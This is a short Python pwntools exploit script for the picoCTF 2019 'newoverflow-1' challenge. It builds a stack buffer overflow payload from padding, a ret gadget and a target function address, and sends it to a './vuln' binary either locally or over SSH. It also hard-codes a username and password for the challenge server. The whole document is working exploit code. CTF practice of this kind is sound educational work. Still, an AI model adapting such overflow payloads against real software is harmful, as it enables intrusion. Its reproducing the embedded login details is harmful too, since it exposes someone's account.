#coding=utf-8
from pwn import *

debug = 1
if debug:
    p = process('./vuln')
else:
    s = ssh(host = '2019shell1.picoctf.com', user = 'zeze', password = 'h9h9ji3g4go6')
    s.set_working_directory('/problems/newoverflow-1_1_39d472170ee5080cac1226374a7101a7')
    p = s.process('./vuln')

buf = 0x7fffffffe320
target = 0x400767
ret = 0x7fffffffe368
gadget_ret = 0x4005de
payload = 'a' * (ret - buf) + p64(gadget_ret) + p64(target)
log.info(payload)
p.sendline(payload)
print p.recvall(1)
